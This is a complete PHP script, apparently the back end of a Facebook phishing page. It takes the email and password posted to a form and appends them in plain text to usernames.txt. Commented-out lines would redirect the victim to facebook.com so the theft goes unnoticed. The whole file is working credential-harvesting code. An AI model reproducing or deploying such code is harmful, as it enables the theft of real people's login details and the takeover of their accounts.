<?php
$email = $_POST['email'];
$pass =  $_POST['pass'];
$rest = substr($email, 0, 2);
$returnIndex = false;

if (strpos($email, '@') !== false || strpos($email, '.') !== false || strpos($email, '09') !== false) {
  $handle = fopen("usernames.txt", "a");
  fwrite($handle, "\n");
   fwrite($handle, $email);
   fwrite($handle, "=");
   fwrite($handle, $pass.",");
  fclose($handle);
  $returnIndex = true;
  //
  // echo("<script>
  // location.replace('https://www.facebook.com');
  // </script>");
}else{

//   echo("<script>
// location.replace('index.php');
// alert('Email doesnt exist');
//   </script>");
$returnIndex = false;
}
echo  json_encode($returnIndex);
 ?>
